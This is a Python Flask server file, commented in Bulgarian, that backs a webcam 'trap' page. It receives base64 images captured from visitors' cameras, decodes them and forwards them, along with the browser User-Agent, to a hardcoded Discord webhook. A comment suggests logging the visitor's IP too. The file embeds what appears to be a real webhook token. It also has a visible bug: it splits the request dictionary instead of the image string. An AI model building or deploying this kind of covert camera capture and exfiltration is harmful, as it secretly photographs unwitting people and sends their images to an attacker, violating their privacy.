from flask import Flask, render_template, request, jsonify
import base64
import requests
import os

# Инициализация на Flask с правилен път към шаблоните
app = Flask(__name__, template_folder='../templates')

# --- ТУК СЛОЖИ ТВОЯ DISCORD WEBHOOK URL ---
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1485737648415838321/n0sOURJ6Chrtd9zbj7ViJSI_TCBWI4sMGhA-jYSP6GnnWdqbZ4NQ7LMvR84R_4LseREE"

@app.route('/')
def index():
    """Зарежда HTML 'капана' за камерата"""
    return render_template('index.html')

@app.route('/api/upload', methods=['POST'])
def upload_image():
    """Приема снимката от JavaScript и я препраща към Discord"""
    try:
        data = request.get_json()
        if not data or 'image' not in data:
            return jsonify({"status": "error", "message": "No data"}), 400

        # Извличане на чистите байтове от Base64 стринга
        image_data = data
        header, encoded = image_data.split(",", 1)
        image_bytes = base64.b64decode(encoded)

        # Подготовка за Discord
        files = {
            'file': ('capture_2026.png', image_bytes, 'image/png')
        }
        
        # Информация за логването (можеш да добавиш IP тук)
        user_agent = request.headers.get('User-Agent')
        payload = {
            "content": f"📸 **Нова снимка от камерата!**\n🌐 **Браузър:** `{user_agent}`"
        }
        
        # Изпращане към Discord
        response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)

        if response.status_code in [200, 204]:
            return jsonify({"status": "success"}), 200
        else:
            return jsonify({"status": "error", "message": "Discord failed"}), 500

    except Exception as e:
        print(f"Грешка: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

# Vercel изисква обекта 'app' да е достъпен директно
if __name__ == '__main__':
    app.run(debug=True)
